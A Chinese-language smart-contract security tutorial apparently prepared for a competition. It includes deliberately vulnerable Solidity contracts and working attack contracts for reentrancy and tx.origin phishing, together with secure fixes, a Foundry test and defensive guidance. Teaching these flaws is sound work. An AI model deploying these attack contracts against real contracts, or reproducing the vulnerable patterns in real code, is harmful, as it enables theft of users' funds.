# 智能合约安全

## 竞赛关联

比赛要求选手进行智能合约安全测试，识别并利用常见漏洞（如重入攻击、整数溢出、访问控制缺陷等），编写攻击合约验证漏洞存在。安全测试是智能合约开发中不可或缺的环节。

## 核心技能

- **重入攻击**：Reentrancy Attack 原理与防御
- **整数溢出**：上溢/下溢（Solidity 0.8+ 已默认防护）
- **访问控制**：Ownable 模式、权限检查
- **tx.origin 攻击**：钓鱼攻击原理
- **闪电贷攻击**：价格操纵、套利

## 详细讲解

### 1. 重入攻击（Reentrancy Attack）

**漏洞合约**：

```solidity
// 漏洞合约：先转账，后更新状态
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");

        // BUG：先转账，后更新余额
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;  // 状态更新在转账后
    }
}
```

**攻击合约**：

```solidity
contract ReentrancyAttack {
    VulnerableBank public bank;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    function attack() public payable {
        // 存款 1 ETH
        bank.deposit{value: msg.value}();
        // 开始取款，触发重入
        bank.withdraw();
    }

    // fallback 函数：收到 ETH 时自动调用
    receive() external payable {
        // 只要银行还有余额，继续取款
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }
}
```

**安全合约**：

```solidity
contract SecureBank {
    mapping(address => uint256) public balances;

    // 重入锁
    bool private locked;

    modifier noReentrant() {
        require(!locked, "Reentrant call");
        locked = true;
        _;
        locked = false;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 安全方案一：先更新状态，后转账
    function withdraw() public noReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");

        // 先更新状态
        balances[msg.sender] = 0;

        // 后转账
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

### 2. 整数溢出

```solidity
contract OverflowExample {
    // Solidity 0.8+ 默认开启溢出检查
    // 以下代码在 0.8+ 会自动回滚

    function add(uint256 a, uint256 b) public pure returns (uint256) {
        return a + b;  // 0.8+ 自动检查溢出
    }

    function subtract(uint256 a, uint256 b) public pure returns (uint256) {
        return a - b;  // 0.8+ 自动检查下溢
    }

    // 如果使用 0.7 版本，需要 SafeMath
    // using SafeMath for uint256;
    // function add(uint256 a, uint256 b) public pure returns (uint256) {
    //     return a.add(b);
    // }
}
```

### 3. 访问控制漏洞

```solidity
// 漏洞合约：任何人都可以调用 setOwner
contract VulnerableAccess {
    address public owner;

    function setOwner(address _owner) public {  // BUG：缺少权限检查
        owner = _owner;
    }

    function withdraw() public {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}

// 安全合约：使用 Ownable 模式
contract SecureAccess {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function setOwner(address _owner) public onlyOwner {  // 只有 owner 可以调用
        require(_owner != address(0), "Invalid address");
        owner = _owner;
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}
```

### 4. tx.origin 钓鱼攻击

```solidity
// 漏洞合约
contract VulnerableWallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function transfer(address payable to, uint256 amount) public {
        // BUG：使用 tx.origin 而非 msg.sender
        require(tx.origin == owner, "Not owner");
        to.transfer(amount);
    }
}

// 攻击合约
contract PhishingAttack {
    VulnerableWallet public wallet;

    constructor(address _wallet) {
        wallet = VulnerableWallet(_wallet);
    }

    function attack() public {
        // 诱导 owner 调用此合约的某个函数
        // 当 owner 调用时，tx.origin == owner
        // 攻击合约可以窃取资金
        wallet.transfer(payable(msg.sender), address(wallet).balance);
    }
}
```

### 5. 安全测试脚本

```solidity
// test/Security.t.sol (Foundry 版)
contract SecurityTest is Test {
    VulnerableBank public bank;
    ReentrancyAttack public attacker;

    function setUp() public {
        bank = new VulnerableBank();
        attacker = new ReentrancyAttack(address(bank));
    }

    function testReentrancyAttack() public {
        // 正常用户存款
        vm.deal(address(1), 10 ether);
        vm.prank(address(1));
        bank.deposit{value: 10 ether}();

        // 攻击者存入 1 ETH 并执行攻击
        vm.deal(address(attacker), 1 ether);
        attacker.attack{value: 1 ether}();

        // 攻击者余额应大于 1 ETH（成功窃取）
        assertGt(address(attacker).balance, 1 ether);
    }
}
```

### 6. 常见安全漏洞总结

| 漏洞类型 | 描述 | 防御措施 |
|----------|------|---------|
| 重入攻击 | 转账前未更新状态，被反复调用 | CEI 模式（检查-生效-交互） |
| 整数溢出 | 数值超过类型范围 | Solidity 0.8+ 默认防护 |
| 访问控制 | 敏感函数未加权限 | Ownable 模式 + modifier |
| tx.origin | 误用 tx.origin 做权限检查 | 使用 msg.sender |
| 时间戳操纵 | 矿工可微调时间戳 | 避免精确时间依赖 |
| 短地址攻击 | 输入数据被截断 | 输入校验 padding |

## 重点内容

- **CEI 模式**：Check（检查条件）→ Effects（更新状态）→ Interactions（外部交互）
- 重入锁 `noReentrant` 是最简单的防御方式
- Solidity 0.8+ 默认开启溢出检查，不需要 SafeMath
- `msg.sender` 是直接调用者，`tx.origin` 是交易发起者
- 攻击合约通过 `receive()` 或 `fallback()` 实现重入

## 注意事项

- 所有外部调用（`call`、`transfer`、`send`）都可能触发重入
- 使用 `transfer` 和 `send` 有 2300 Gas 限制，相对安全但功能受限
- 安全审计不能替代充分测试
- 主网部署前建议使用专业审计工具（Slither、Mythril）

## 常见误区

- 误区：认为 `transfer` 绝对安全（Gas 限制可能变化）
- 误区：使用 `tx.origin` 做权限检查（钓鱼攻击）
- 误区：仅依赖编译器版本解决问题（仍需理解原理）
- 误区：安全测试只测正常流程，不测攻击场景

## 官方资源扩展

- [Solidity 安全考量](https://docs.soliditylang.org/zh/latest/security-considerations.html) - 官方安全建议
- [OpenZeppelin Security](https://docs.openzeppelin.com/contracts/4.x/security) - 安全最佳实践
- [Ethernaut CTF](https://ethernaut.openzeppelin.com/) - 合约安全闯关游戏
- [SWC Registry](https://swcregistry.io/) - 智能合约弱点分类
- [Slither 静态分析](https://github.com/crytic/slither) - 合约安全分析工具